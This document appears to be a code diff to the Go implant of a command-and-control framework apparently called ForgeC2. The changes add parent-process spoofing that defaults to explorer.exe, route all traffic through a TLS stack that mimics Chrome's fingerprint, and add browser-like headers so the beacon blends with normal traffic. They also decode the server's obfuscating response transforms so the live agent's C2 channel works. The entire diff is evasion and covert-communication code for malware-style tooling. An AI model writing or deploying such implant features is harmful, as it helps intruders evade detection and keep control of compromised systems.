@@ -187,6 +187,15 @@ func init() {
 	if v := os.Getenv("FORGEC2_PPID_SPOOF"); v == "1" || strings.ToLower(v) == "true" {
 		ppidSpoofEnabled = true
 	}
+	if ppidSpoofEnabled {
+		ppidSpoofParent = PPIDSpoofParent
+		if v := os.Getenv("FORGEC2_PPID_PARENT"); v != "" {
+			ppidSpoofParent = v
+		}
+		if ppidSpoofParent == "" {
+			ppidSpoofParent = "explorer.exe"
+		}
+	}
 
 	egressDetection = strings.ToLower(EgressDetectionStr) == "true" || EgressDetectionStr == "1"
 
@@ -293,18 +302,10 @@ func init() {
 		}
 	}
 
-	// TLS verification controlled by SkipTLSVerify (injected at build time)
-	var tr *http.Transport
-	if chameleonEnabled {
-		tr = newUTLSTransport()
-	} else {
-		tr = &http.Transport{
-			MaxIdleConns:        10,
-			MaxIdleConnsPerHost: 5,
-			IdleConnTimeout:     60 * time.Second,
-			TLSClientConfig:     newAgentTLSConfig(DomainFront),
-		}
-	}
+	// All HTTPS egress uses the utls dialer so the ClientHello is a realistic,
+	// configurable fingerprint (Chrome Auto by default; the chameleon build
+	// rotates it) instead of the Go-stdlib stack.
+	tr := newUTLSTransport()
 	if ProxyStr != "" {
 		proxyURL, err := url.Parse(ProxyStr)
 		if err == nil {
@@ -1208,6 +1209,13 @@ func sendToC2(idx int, body []byte) []byte {
 	}
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("User-Agent", getActiveUserAgentFromConfig())
+	// Baseline browser-like headers so the beacon blends with ordinary HTTPS
+	// traffic (cover-traffic fidelity). Malleable request headers and any
+	// profile-supplied headers below override these defaults.
+	req.Header.Set("Accept", "application/json, text/plain, */*")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+	req.Header.Set("Connection", "keep-alive")
 	for k, v := range getActiveHeaders() {
 		if strings.EqualFold(k, "Content-Type") || strings.EqualFold(k, "User-Agent") {
 			continue
@@ -1254,6 +1262,17 @@ func sendToC2(idx int, body []byte) []byte {
 	// prepend/append bytes. Strip them here (HTTP transport only) so the
 	// JSON envelope below parses; binary transports never wrap the frame.
 	data = stripMalleableWrapping(data)
+	// Reverse the server's profile output transforms (e.g. base64+xor) so the
+	// encrypted envelope can be recovered; without this the preset C2 pipeline
+	// is dead for the live agent. Decode order is the reverse of the server's
+	// apply order, which agentApplyTransforms handles when encode=false.
+	if len(malleableRespDecodeSteps) > 0 {
+		if dec, err := agentApplyTransforms(data, malleableRespDecodeSteps, false); err == nil {
+			data = dec
+		} else if Debug {
+			fmt.Printf("[!] malleable response decode failed: %v\n", err)
+		}
+	}
 	return data
 }
 
